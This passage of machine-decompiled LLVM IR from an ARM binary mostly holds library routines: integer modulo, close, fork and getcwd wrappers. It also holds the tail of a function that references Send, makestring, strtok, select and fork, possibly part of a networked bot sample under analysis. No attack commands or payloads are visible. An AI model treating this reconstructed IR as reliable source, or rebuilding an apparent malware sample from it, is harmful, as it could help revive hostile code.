  br i1 %v2_a88c, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a894

dec_label_pc_a894:                                ; preds = %dec_label_pc_a628, %dec_label_pc_a874
  %storemerge34.in = phi i32 [ %v6_a87c, %dec_label_pc_a874 ], [ %v6_a658, %dec_label_pc_a628 ]
  %storemerge34 = inttoptr i32 %storemerge34.in to i8*
  %v2_a898 = load i8, i8* %storemerge34, align 1
  %v2_a89c = icmp eq i8 %v2_a898, 0
  br i1 %v2_a89c, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a668

; uselistorder directives
  uselistorder i8* %storemerge34, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge34.in, { 7, 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %v7_a84c, { 1, 0 }
  uselistorder i32 %v1_a83c, { 1, 0 }
  uselistorder i32 %storemerge21118, { 1, 0 }
  uselistorder i32 %.pre36, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0, 3 }
  uselistorder i32 %v5_a610, { 1, 0, 2 }
  uselistorder i32 %v2_a5ac, { 2, 1, 0 }
  uselistorder i32 %v1_a550, { 1, 0 }
  uselistorder i32 %v3_a51c, { 1, 0 }
  uselistorder i32 %storemerge18101, { 1, 0 }
  uselistorder i32 %v1_a500, { 1, 0 }
  uselistorder i32 %v1_a4cc, { 1, 0 }
  uselistorder i32 %v2_a4c8, { 1, 0 }
  uselistorder i32 %v1_a44c, { 0, 2, 1 }
  uselistorder i32 %v1_a4cc90, { 1, 0 }
  uselistorder i32 %.pre132, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge16114, { 1, 0 }
  uselistorder i32 %v2_a360, { 1, 0 }
  uselistorder i32 %storemerge1529, { 1, 0 }
  uselistorder i32 %v2_a5fc, { 0, 2, 1 }
  uselistorder i32 %v2_a320, { 1, 0 }
  uselistorder i32 %v1_a228, { 1, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %v3_a0b4, { 1, 0, 2 }
  uselistorder i32 %v2_a028, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-76.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1684, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1d434.391 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_1d434.391, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32* @global_var_1fe74.288, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_1d7fc.286, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_1fe5c.343, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_1fe64.352, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_1fe54.378, { 1, 0 }
  uselistorder i32* @global_var_1fe50.294, { 1, 0 }
  uselistorder i32* @global_var_1fe58.314, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1325c.292 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a894, { 1, 0 }
  uselistorder label %dec_label_pc_a7d4, { 1, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a698, { 1, 0 }
  uselistorder label %dec_label_pc_a588, { 1, 0 }
  uselistorder label %dec_label_pc_a56c, { 1, 0 }
  uselistorder label %dec_label_pc_a518, { 1, 0 }
  uselistorder label %dec_label_pc_a458, { 1, 0 }
  uselistorder label %dec_label_pc_a334, { 1, 0 }
  uselistorder label %dec_label_pc_a334.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a2c0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a1d8, { 1, 0 }
  uselistorder label %dec_label_pc_a114, { 1, 0 }
  uselistorder label %dec_label_pc_a0fc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_9fe4, { 1, 0 }
  uselistorder label %dec_label_pc_9f70, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_a90c = icmp eq i32 %arg2, 0
  br i1 %v2_a90c, label %dec_label_pc_a9e0, label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %entry
  %v1_a90c = icmp slt i32 %arg2, 0
  br i1 %v1_a90c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_a914
  %v2_a914 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_a914, %bb
  %v4_a92c = phi i32 [ %arg2, %dec_label_pc_a914 ], [ %v2_a914, %bb ]
  %v0_a918 = load i32, i32* @r0, align 4
  %v1_a918 = icmp slt i32 %v0_a918, 0
  br i1 %v1_a918, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_a91c = sub i32 0, %v0_a918
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_a924 = phi i32 [ %v0_a918, %bb79 ], [ %v2_a91c, %bb80 ]
  %v1_a920 = add i32 %v4_a92c, -1
  %v7_a920 = icmp eq i32 %v4_a92c, 1
  br i1 %v7_a920, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_a924 = icmp eq i32 %v1_a924, %v4_a92c
  br i1 %v10_a924, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_a924 = icmp ult i32 %v1_a924, %v4_a92c
  br i1 %v4_a924, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_a92c = and i32 %v1_a920, %v4_a92c
  %v8_a92c = icmp eq i32 %v6_a92c, 0
  br i1 %v8_a92c, label %.thread72, label %dec_label_pc_a93c.preheader

dec_label_pc_a93c.preheader:                      ; preds = %bb84
  %v2_a93c109 = icmp ugt i32 %v4_a92c, 268435455
  br i1 %v2_a93c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_a93064 = phi i32 [ %v1_a924, %bb84 ], [ 0, %.thread70 ]
  %v3_a930 = and i32 %v1_a93064, %v1_a920
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_a93c.preheader
  %v0_a950.pr35.lcssa = phi i32 [ %v4_a92c, %dec_label_pc_a93c.preheader ], [ %v4_a944, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_a93c.preheader ], [ %v2_a9489, %.thread2.thread7 ]
  br label %dec_label_pc_a950thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_a93c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_a9489, %.thread2.thread7 ], [ 0, %dec_label_pc_a93c.preheader ]
  %v0_a950.pr35110 = phi i32 [ %v4_a944, %.thread2.thread7 ], [ %v4_a92c, %dec_label_pc_a93c.preheader ]
  %v4_a940 = icmp ult i32 %v0_a950.pr35110, %v1_a924
  br i1 %v4_a940, label %bb86, label %dec_label_pc_a950thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_a944 = and i32 %v0_a950.pr35110, 268435456
  %v3_a944 = icmp eq i32 %v2_a944, 0
  %v4_a944 = mul i32 %v0_a950.pr35110, 16
  br i1 %v3_a944, label %.thread2.thread7, label %dec_label_pc_a950.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_a9489 = add i32 %storemerge111, 4
  %v2_a93c = icmp ugt i32 %v4_a944, 268435455
  br i1 %v2_a93c, label %.thread1, label %bb85

dec_label_pc_a950thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_a950thread-pre-split.loopexit

dec_label_pc_a950thread-pre-split.loopexit:       ; preds = %dec_label_pc_a950thread-pre-split.loopexit.loopexit, %.thread1
  %v0_a950.pr35108 = phi i32 [ %v0_a950.pr35.lcssa, %.thread1 ], [ %v0_a950.pr35110, %dec_label_pc_a950thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_a950thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a950thread-pre-split

dec_label_pc_a950thread-pre-split:                ; preds = %.thread4, %dec_label_pc_a950thread-pre-split.loopexit
  %v1_a95c41 = phi i32 [ %storemerge105, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v2_a95c, %.thread4 ]
  %v2_a95436 = phi i32 [ %v1_a924, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v2_a954, %.thread4 ]
  %v0_a950.pr = phi i32 [ %v0_a950.pr35108, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v3_a958, %.thread4 ]
  br label %dec_label_pc_a950

dec_label_pc_a950.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_a950

dec_label_pc_a950:                                ; preds = %dec_label_pc_a950.loopexit, %dec_label_pc_a950thread-pre-split
  %v0_a964.pr = phi i32 [ %v1_a95c41, %dec_label_pc_a950thread-pre-split ], [ %storemerge111, %dec_label_pc_a950.loopexit ]
  %v2_a954 = phi i32 [ %v2_a95436, %dec_label_pc_a950thread-pre-split ], [ %v1_a924, %dec_label_pc_a950.loopexit ]
  %v1_a958 = phi i32 [ %v0_a950.pr, %dec_label_pc_a950thread-pre-split ], [ %v4_a944, %dec_label_pc_a950.loopexit ]
  %v2_a950 = icmp slt i32 %v1_a958, 0
  br i1 %v2_a950, label %dec_label_pc_a964, label %bb87

bb87:                                             ; preds = %dec_label_pc_a950
  %v4_a954 = icmp ult i32 %v1_a958, %v2_a954
  br i1 %v4_a954, label %.thread4, label %dec_label_pc_a964

.thread4:                                         ; preds = %bb87
  %v3_a958 = mul i32 %v1_a958, 2
  %v2_a95c = add i32 %v0_a964.pr, 1
  br label %dec_label_pc_a950thread-pre-split

dec_label_pc_a964:                                ; preds = %bb87, %dec_label_pc_a950
  %v2_a964 = add i32 %v0_a964.pr, -3
  %v5_a968 = icmp slt i32 %v0_a964.pr, 3
  br i1 %v5_a968, label %dec_label_pc_a9a8, label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a964, %bb91
  %v6_a994 = phi i32 [ %v0_a99c, %bb91 ], [ %v2_a964, %dec_label_pc_a964 ]
  %v1_a970 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %bb91 ], [ %v2_a954, %dec_label_pc_a964 ]
  %v3_a99010 = phi i32 [ %v3_a990, %bb91 ], [ %v1_a958, %dec_label_pc_a964 ]
  %v3_a96c = icmp ult i32 %v1_a970, %v3_a99010
  %v3_a970 = select i1 %v3_a96c, i32 0, i32 %v3_a99010
  %v1_a978 = sub i32 %v1_a970, %v3_a970
  %v4_a974 = udiv i32 %v3_a99010, 2
  %v6_a974 = icmp ult i32 %v1_a978, %v4_a974
  %v6_a978 = select i1 %v6_a974, i32 0, i32 %v4_a974
  %v1_a978.v6_a978 = sub i32 %v1_a978, %v6_a978
  %.demorgan = and i1 %v3_a96c, %v6_a974
  %v4_a97c = udiv i32 %v3_a99010, 4
  %v6_a97c = icmp ult i32 %v1_a978.v6_a978, %v4_a97c
  %v6_a980 = select i1 %v6_a97c, i32 0, i32 %v4_a97c
  %v1_a978.v6_a978.v6_a980 = sub i32 %v1_a978.v6_a978, %v6_a980
  %.demorgan76 = and i1 %.demorgan, %v6_a97c
  %v4_a984 = udiv i32 %v3_a99010, 8
  %v6_a984 = icmp ult i32 %v1_a978.v6_a978.v6_a980, %v4_a984
  %v6_a988 = select i1 %v6_a984, i32 0, i32 %v4_a984
  %v1_a978.v6_a978.v6_a980.v6_a988 = sub i32 %v1_a978.v6_a978.v6_a980, %v6_a988
  %.demorgan77 = and i1 %.demorgan76, %v6_a984
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_a96c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_a96c, %bb88
  %v2_a98c = add i32 %v1_a978.v6_a978.v6_a980.v6_a988, -1
  %v4_a98c = sub i32 0, %v1_a978.v6_a978.v6_a980.v6_a988
  %v5_a98c = and i32 %v1_a978.v6_a978.v6_a980.v6_a988, %v4_a98c
  %v3_a990 = udiv i32 %v3_a99010, 16
  %v5_a994 = icmp slt i32 %v1_a978.v6_a978.v6_a980.v6_a988, 1
  br i1 %v5_a994, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_a994 = add i32 %v6_a994, -4
  %v9_a994 = sub i32 3, %v6_a994
  %v10_a994 = and i32 %v9_a994, %v6_a994
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_a99c = phi i32 [ %v6_a994, %bb89 ], [ %v7_a994, %bb90 ]
  %v0_a99813.in = phi i32 [ %v2_a98c, %bb89 ], [ %v7_a994, %bb90 ]
  %v1_a99812.in = phi i32 [ %v5_a98c, %bb89 ], [ %v10_a994, %bb90 ]
  %v1_a99812 = icmp slt i32 %v1_a99812.in, 0
  %v0_a99813 = icmp slt i32 %v0_a99813.in, 0
  %v2_a998 = xor i1 %v0_a99813, %v1_a99812
  br i1 %v2_a998, label %dec_label_pc_a99c, label %dec_label_pc_a96c

dec_label_pc_a99c:                                ; preds = %bb91
  %v1_a99c = urem i32 %v0_a99c, 4
  %v2_a99c = icmp eq i32 %v1_a99c, 0
  br i1 %v2_a99c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_a99c
  %v3_a9a0 = icmp eq i32 %v1_a978.v6_a978.v6_a980.v6_a988, 0
  br i1 %v3_a9a0, label %.thread6, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %bb92, %dec_label_pc_a964
  %v0_a9bc = phi i32 [ %v3_a990, %bb92 ], [ %v1_a958, %dec_label_pc_a964 ]
  %v1_a9b8 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %bb92 ], [ %v2_a954, %dec_label_pc_a964 ]
  %v0_a9a8 = phi i32 [ %v0_a99c, %bb92 ], [ %v2_a964, %dec_label_pc_a964 ]
  %v5_a9ac = icmp slt i32 %v0_a9a8, -2
  br i1 %v5_a9ac, label %dec_label_pc_a9cc, label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9a8
  %v8_a9a8 = icmp eq i32 %v0_a9a8, -2
  br i1 %v8_a9a8, label %dec_label_pc_a9c0, label %dec_label_pc_a9b4

dec_label_pc_a9b4:                                ; preds = %dec_label_pc_a9b0
  %v3_a9b4 = icmp ult i32 %v1_a9b8, %v0_a9bc
  br i1 %v3_a9b4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_a9b4
  %v2_a9b4 = sub i32 %v1_a9b8, %v0_a9bc
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_a9b4, %bb93
  %v0_a9c054 = phi i32 [ %v1_a9b8, %dec_label_pc_a9b4 ], [ %v2_a9b4, %bb93 ]
  %v3_a9bc = udiv i32 %v0_a9bc, 2
  br label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %bb94
  %v0_a9c8 = phi i32 [ %v0_a9bc, %dec_label_pc_a9b0 ], [ %v3_a9bc, %bb94 ]
  %v1_a9c4 = phi i32 [ %v1_a9b8, %dec_label_pc_a9b0 ], [ %v0_a9c054, %bb94 ]
  %v3_a9c0 = icmp ult i32 %v1_a9c4, %v0_a9c8
  br i1 %v3_a9c0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_a9c0
  %v2_a9c0 = sub i32 %v1_a9c4, %v0_a9c8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_a9c0, %bb95
  %v0_a9cc57 = phi i32 [ %v1_a9c4, %dec_label_pc_a9c0 ], [ %v2_a9c0, %bb95 ]
  %v3_a9c8 = udiv i32 %v0_a9c8, 2
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_a9a8, %bb96
  %v2_a9d0 = phi i32 [ %v0_a9bc, %dec_label_pc_a9a8 ], [ %v3_a9c8, %bb96 ]
  %v1_a9d0 = phi i32 [ %v1_a9b8, %dec_label_pc_a9a8 ], [ %v0_a9cc57, %bb96 ]
  %v3_a9cc = icmp ult i32 %v1_a9d0, %v2_a9d0
  br i1 %v3_a9cc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_a9cc
  %v2_a9cc = sub i32 %v1_a9d0, %v2_a9d0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_a9cc, %bb83, %.thread72, %dec_label_pc_a99c, %bb92, %bb97
  %v1_a9d8 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %dec_label_pc_a99c ], [ 0, %bb92 ], [ %v1_a9d0, %dec_label_pc_a9cc ], [ %v2_a9cc, %bb97 ], [ %v3_a930, %.thread72 ], [ %v1_a924, %bb83 ]
  br i1 %v1_a918, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_a9d8 = sub i32 0, %v1_a9d8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_a9dc = phi i32 [ %v1_a9d8, %.thread6 ], [ %v2_a9d8, %bb98 ]
  ret i32 %v1_a9dc

dec_label_pc_a9e0:                                ; preds = %entry
  %v0_a9e0 = load i32, i32* @lr, align 4
  %v0_a9e4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_a9e0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_a9bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a99c, { 1, 0, 2 }
  uselistorder i32 %v7_a994, { 1, 0 }
  uselistorder i32 %v3_a990, { 1, 0 }
  uselistorder i32 %v1_a978.v6_a978.v6_a980.v6_a988, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_a984, { 1, 0 }
  uselistorder i32 %v4_a97c, { 1, 0 }
  uselistorder i32 %v4_a974, { 1, 0 }
  uselistorder i32 %v6_a994, { 3, 0, 2, 1 }
  uselistorder i32 %v2_a964, { 1, 0 }
  uselistorder i32 %v1_a958, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_a954, { 1, 0, 3, 2 }
  uselistorder i32 %v4_a944, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a950.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a924, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_a92c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_a9cc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_a96c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_a9f0 = load i32, i32* @r0, align 4
  ret i32 %v1_a9f0
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a9f4 = load i32, i32* @r4, align 4
  store i32 %v3_a9f4, i32* %stack_var_-8, align 4
  %v1_a9f8 = call i32 @close(i32 %arg1)
  store i32 %v1_a9f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_a9f8, -4095
  br i1 %tmp, label %dec_label_pc_aa18, label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %entry
  %v0_aa08 = call i32 @__errno_location()
  %v0_aa0c = load i32, i32* %r4.global-to-local, align 4
  %v1_aa0c = sub i32 0, %v0_aa0c
  %v2_aa10 = inttoptr i32 %v0_aa08 to i32*
  store i32 %v1_aa0c, i32* %v2_aa10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %entry, %dec_label_pc_aa08
  %v0_aa18 = phi i32 [ %v1_a9f8, %entry ], [ -1, %dec_label_pc_aa08 ]
  %v2_aa1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa1c, i32* @r4, align 4
  ret i32 %v0_aa18

; uselistorder directives
  uselistorder i32 %v1_a9f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa18, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aa20 = load i32, i32* @r4, align 4
  store i32 %v3_aa20, i32* %stack_var_-8, align 4
  %v0_aa24 = call i32 @fork()
  store i32 %v0_aa24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa24, -4095
  br i1 %tmp, label %dec_label_pc_aa44, label %dec_label_pc_aa34

dec_label_pc_aa34:                                ; preds = %entry
  %v0_aa34 = call i32 @__errno_location()
  %v0_aa38 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa38 = sub i32 0, %v0_aa38
  %v2_aa3c = inttoptr i32 %v0_aa34 to i32*
  store i32 %v1_aa38, i32* %v2_aa3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa44

dec_label_pc_aa44:                                ; preds = %entry, %dec_label_pc_aa34
  %v0_aa44 = phi i32 [ %v0_aa24, %entry ], [ -1, %dec_label_pc_aa34 ]
  %v2_aa48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa48, i32* @r4, align 4
  ret i32 %v0_aa44

; uselistorder directives
  uselistorder i32 %v0_aa24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa44, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_aa4c = load i32, i32* @r4, align 4
  store i32 %v3_aa4c, i32* %stack_var_-20, align 4
  %v6_aa4c = load i32, i32* @r5, align 4
  %v9_aa4c = load i32, i32* @r6, align 4
  %v12_aa4c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_aa50 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_aa5c = icmp eq i32 %arg1, 0
  br i1 %v2_aa50, label %dec_label_pc_aa5c, label %dec_label_pc_aa8c

dec_label_pc_aa5c:                                ; preds = %entry
  br i1 %v2_aa5c, label %dec_label_pc_aa78, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa5c
  %v0_aa64 = call i32 @__errno_location()
  %v0_aa68 = load i32, i32* @r7, align 4
  store i32 %v0_aa68, i32* @r5, align 4
  %v2_aa70 = inttoptr i32 %v0_aa64 to i32*
  store i32 22, i32* %v2_aa70, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_aa78:                                ; preds = %dec_label_pc_aa5c
  %v0_aa78 = call i32 @__GI_getpagesize()
  %v5_aa80 = icmp slt i32 %v0_aa78, 4096
  br i1 %v5_aa80, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_aa78
  store i32 %v0_aa78, i32* @r4, align 4
  br label %dec_label_pc_aa9c

bb15:                                             ; preds = %dec_label_pc_aa78
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_aa9c

dec_label_pc_aa8c:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_aa5c, label %dec_label_pc_aa9c, label %bb16

bb16:                                             ; preds = %dec_label_pc_aa8c
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_aaac

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa8c, %bb, %bb15
  %v0_aa9c = phi i32 [ %v0_aa78, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_aa8c ]
  %v1_aaa0 = call i32 @malloc(i32 %v0_aa9c)
  store i32 %v1_aaa0, i32* @r6, align 4
  %v2_aaa4 = icmp eq i32 %v1_aaa0, 0
  br i1 %v2_aaa4, label %dec_label_pc_ab18, label %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge

dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge:    ; preds = %dec_label_pc_aa9c
  %v0_aaac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aaac

dec_label_pc_aaac:                                ; preds = %bb16, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge
  %v0_aab0 = phi i32 [ %v1_aaa0, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge ], [ %arg1, %bb16 ]
  %v0_aaac = phi i32 [ %v0_aaac.pre, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge ], [ %arg2, %bb16 ]
  %v2_aab4 = call i32 @getcwd(i32 %v0_aab0, i32 %v0_aaac)
  store i32 %v2_aab4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_aab4, -4095
  br i1 %tmp, label %dec_label_pc_aad4, label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaac
  %v0_aac4 = call i32 @__errno_location()
  %v0_aac8 = load i32, i32* @r4, align 4
  %v1_aac8 = sub i32 0, %v0_aac8
  %v2_aacc = inttoptr i32 %v0_aac4 to i32*
  store i32 %v1_aac8, i32* %v2_aacc, align 4
  br label %dec_label_pc_ab04

dec_label_pc_aad4:                                ; preds = %dec_label_pc_aaac
  %v1_aad4 = icmp slt i32 %v2_aab4, 0
  br i1 %v1_aad4, label %dec_label_pc_ab04, label %dec_label_pc_aadc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_aad4
  %v0_aadc = load i32, i32* @r5, align 4
  %v2_aadc = icmp eq i32 %v0_aadc, 0
  br i1 %v2_aadc, label %bb17, label %dec_label_pc_aaf8.thread7

dec_label_pc_aaf8.thread7:                        ; preds = %dec_label_pc_aadc
  br label %dec_label_pc_ab1c

bb17:                                             ; preds = %dec_label_pc_aadc
  %v1_aae0 = load i32, i32* @r7, align 4
  %v3_aae0 = icmp eq i32 %v1_aae0, 0
  br i1 %v3_aae0, label %dec_label_pc_aaf8, label %dec_label_pc_aaf8.thread

dec_label_pc_aaf8.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_aaf8:                                ; preds = %bb17
  %v0_aaec = load i32, i32* @r6, align 4
  %v2_aaf0 = call i32 @realloc(i32 %v0_aaec, i32 %v2_aab4)
  store i32 %v2_aaf0, i32* @r5, align 4
  %v2_aaf8 = icmp eq i32 %v2_aaf0, 0
  br i1 %v2_aaf8, label %bb18, label %dec_label_pc_ab1c

bb18:                                             ; preds = %dec_label_pc_aaf8.thread, %dec_label_pc_aaf8
  %v1_aafc = load i32, i32* @r6, align 4
  store i32 %v1_aafc, i32* @r5, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aad4, %dec_label_pc_aac4
  %v0_ab04 = load i32, i32* @r5, align 4
  %v2_ab04 = icmp eq i32 %v0_ab04, 0
  br i1 %v2_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_ab18

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_ab04
  %v0_ab0c = load i32, i32* @r6, align 4
  store i32 %v0_ab0c, i32* @r0, align 4
  %v0_ab10 = call i32 @free()
  br label %dec_label_pc_ab1c

dec_label_pc_ab18:                                ; preds = %dec_label_pc_ab04, %dec_label_pc_aa9c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_ab1c:                                ; preds = %dec_label_pc_aaf8.thread7, %bb18, %dec_label_pc_aaf8, %dec_label_pc_ab0c, %dec_label_pc_aa64, %dec_label_pc_ab18
  %v0_ab1c = load i32, i32* @r5, align 4
  %v2_ab20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ab20, i32* @r4, align 4
  store i32 %v6_aa4c, i32* @r5, align 4
  store i32 %v9_aa4c, i32* @r6, align 4
  store i32 %v12_aa4c, i32* @r7, align 4
  ret i32 %v0_ab1c

; uselistorder directives
  uselistorder i32 %v2_aab4, { 2, 3, 0, 1 }
  uselistorder i32 %v0_aa78, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_ab1c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_aaac, { 1, 0 }
  uselistorder label %dec_label_pc_aa9c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_ab28 = load i32, i32* @global_var_1fe18.395, align 4
  %v2_ab2c = icmp eq i32 %v2_ab28, 0
